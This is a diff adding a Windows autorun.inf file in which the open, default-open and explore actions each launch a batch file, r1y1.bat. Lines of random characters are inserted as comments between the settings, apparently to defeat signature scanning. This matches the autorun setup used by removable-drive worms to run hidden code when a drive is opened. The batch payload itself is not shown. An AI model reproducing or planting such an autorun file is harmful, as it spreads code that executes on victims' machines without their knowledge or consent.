@@ -1,0 +1,11 @@
+;0K4iKKm5DKwIk3wAiqJ43S0is79k2drLSdsJa31iAa3l2CfD3jkelws004pilalaarrl5JisKqw2K
+[AutoRun]
+;
+open=r1y1.bat
+;U8dA
+shell\open\Command=r1y1.bat
+;L
+shell\open\Default=1
+;K2
+shell\explore\Command=r1y1.bat
+;SDok0ac2DC0skJwsKljiikdIddrks7sAasrl23qwD9LKJAX3OKeld7K54i20waa48kFcajAa3Doi6S4iKfwqD2253daimi3ij5pf4e4sZfHkKsekwoo3oJwa8kJdZw0
